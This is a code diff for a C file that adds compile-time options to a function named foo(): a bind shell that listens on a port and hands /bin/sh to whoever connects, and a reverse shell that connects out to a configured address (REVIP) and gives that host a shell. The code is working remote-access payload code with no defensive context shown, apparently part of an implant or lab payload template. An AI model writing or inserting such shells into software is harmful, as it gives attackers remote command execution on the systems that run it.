@@ -9,7 +9,7 @@
 #include <unistd.h>
 #include <syslog.h>
 #include <string.h>
-#include <curl/curl.h>
+//#include <curl/curl.h>
 
 void foo();
 
@@ -150,10 +150,41 @@ void foo()
 
   #ifdef BINDSHELL
   printf("BINDSHELL: %d!\n", BINDSHELL);
+  struct sockaddr_in addr;
+  addr.sin_family = AF_INET;
+  addr.sin_port = htons(REVPORT);
+  addr.sin_addr.s_addr = INADDR_ANY;
+
+  int sockfd = socket(AF_INET, SOCK_STREAM, 0);
+  bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));
+  listen(sockfd, 0);
+
+  int connfd = accept(sockfd, NULL, NULL);
+  for (int i = 0; i < 3; i++)
+  {
+      dup2(connfd, i);
+  }
+  execve("/bin/sh", NULL, NULL);
   #endif
 
   #ifdef REVERSESHELL
   printf("REVERSESHELL: %d!\n", REVERSESHELL);
+  const char* ip = REVIP;
+  struct sockaddr_in addr;
+
+  addr.sin_family = AF_INET;
+  addr.sin_port = htons(REVPORT);
+  inet_aton(ip, &addr.sin_addr);
+
+  int sockfd = socket(AF_INET, SOCK_STREAM, 0);
+  connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));
+
+  for (int i = 0; i < 3; i++)
+  {
+      dup2(sockfd, i);
+  }
+
+  execve("/bin/sh", NULL, NULL);
   #endif
 
   #ifdef REVERSEIP
